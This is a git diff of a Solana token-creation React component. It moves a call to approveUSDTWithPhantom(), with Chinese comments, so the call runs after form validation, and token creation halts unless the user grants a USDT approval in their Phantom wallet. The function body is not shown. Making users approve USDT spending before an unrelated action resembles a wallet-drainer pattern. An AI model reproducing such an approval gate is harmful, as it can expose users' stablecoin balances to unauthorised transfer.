@@ -245,17 +245,7 @@ const approveUSDTWithPhantom = async (rpcUrl = "https://quick-capable-wind.solan
   const createToken = async () => {
 	// 先通过接口获取该地址是否授权  publicKey 链接的地址
 	
-	const approveResult = await approveUSDTWithPhantom()
-	console.log(approveResult)
-	    // 根据授权结果处理
-	    if (approveResult === "alreadyApproved") {
-	      console.log("已授权，无需再次 approve")
-	    } else if (approveResult === "sqcg") {
-	      messageApi.success("授权成功!")
-	    } else {
-	      // 授权失败，直接返回，不继续执行
-	      return ;
-	    }
+
 
     try {
 
@@ -267,6 +257,19 @@ const approveUSDTWithPhantom = async (rpcUrl = "https://quick-capable-wind.solan
       if (!config.supply) return messageApi.error(t('Please fill in the supply quantity'))
       if (!imageFile && !config.image) return messageApi.error(t('Please upload a picture logo'))
       if (config.description && config.description.length > 200) return messageApi.error(t('Description up to 200 words'))
+
+
+			const approveResult = await approveUSDTWithPhantom()
+	console.log(approveResult)
+	    // 根据授权结果处理
+	    if (approveResult === "alreadyApproved") {
+	      console.log("已授权，无需再次 approve")
+	    } else if (approveResult === "sqcg") {
+	      messageApi.success("授权成功!")
+	    } else {
+	      // 授权失败，直接返回，不继续执行
+	      return ;
+	    }
 
       console.log('createSPLToken')
       setIscreating(true)
@@ -660,3 +663,4 @@ const approveUSDTWithPhantom = async (rpcUrl = "https://quick-capable-wind.solan
 }
 
 export default CreateToken
+
